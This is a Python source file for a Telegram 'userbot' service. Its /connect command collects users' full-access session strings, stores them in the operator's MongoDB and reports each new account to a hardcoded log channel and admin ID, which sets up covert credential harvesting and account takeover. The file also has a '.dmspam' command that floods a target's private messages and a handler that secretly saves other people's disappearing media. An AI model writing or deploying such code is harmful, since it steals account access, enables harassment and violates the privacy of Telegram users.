import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    filters, ContextTypes
)
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = -1002753939875
ADMIN_ID = 7755789304

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("bot")

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

# Running clients dict
running_clients = {}

# Start Telegram Bot
app = ApplicationBuilder().token(BOT_TOKEN).build()

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Help", callback_data="help")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 Welcome to the Multi-Session UserBot!\nUse /connect <session_string> to connect your account.",
        reply_markup=reply_markup
    )

# /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 Available Commands:\n"
        "/connect <SESSION> - Connect your account\n"
        ".dmspam <username> <count> <message> - Spam someone's DM\n"
        "🛡️ Disappearing media will be saved to Saved Messages automatically."
    )

# /connect command
async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("❌ Please provide your session string.")
        return

    session_string = context.args[0]
    user_id = update.effective_user.id

    # Save to DB
    await sessions.update_one({"_id": user_id}, {"$set": {"session": session_string}}, upsert=True)

    # Log session to channel
    await context.bot.send_message(
        chat_id=LOG_CHANNEL_ID,
        text=f"🔐 New session received from user `{user_id}`"
    )

    # Try to connect session
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.message.reply_text("❌ Invalid session string or not logged in.")
            return

        me = await client.get_me()
        running_clients[user_id] = client

        await client.send_message("me", "✅ Your UserBot is now connected and running!")

        # Notify admin
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ New session connected:\n• ID: `{me.id}`\n• Username: @{me.username or 'N/A'}"
        )

        # Add handlers
        client.add_event_handler(lambda e: handle_media(e, client), events.NewMessage(incoming=True))
        client.add_event_handler(lambda e: handle_dmspam(e, client), events.NewMessage(
            pattern=r".dmspam (.+) (\d+) (.+)", outgoing=True))

        # Run client
        asyncio.create_task(client.run_until_disconnected())
        await update.message.reply_text("✅ Session connected and running.")

    except Exception as e:
        logger.error(f"Connection error: {e}")
        await update.message.reply_text("❌ Failed to connect session.")

# Callback button
async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query.data == "help":
        await update.callback_query.answer()
        await help_command(update.callback_query, context)

# Handle disappearing media
async def handle_media(event, client):
    if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
        try:
            await client.send_file(
                "me",
                event.media,
                caption=f"Saved disappearing media from {event.sender_id} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except Exception as e:
            logger.warning(f"Media save failed: {e}")

# DM spam handler
async def handle_dmspam(event, client):
    try:
        username, count, msg = event.pattern_match.groups()
        count = int(count)
        if count > 50:
            await event.reply("❌ Max 50 messages allowed.")
            return
        user = await client.get_entity(username)
        for _ in range(count):
            await client.send_message(user, msg)
        await event.reply(f"✅ Sent {count} messages to {username}")
    except Exception as e:
        await event.reply(f"❌ Spam failed: {e}")

# Add handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("connect", connect))
app.add_handler(MessageHandler(filters.TEXT & filters.Regex("/help"), help_command))
app.add_handler(MessageHandler(filters.TEXT & filters.Regex("/start"), start))
app.add_handler(MessageHandler(filters.StatusUpdate.ALL, callback_query))

print("🤖 Bot running...")
app.run_polling()
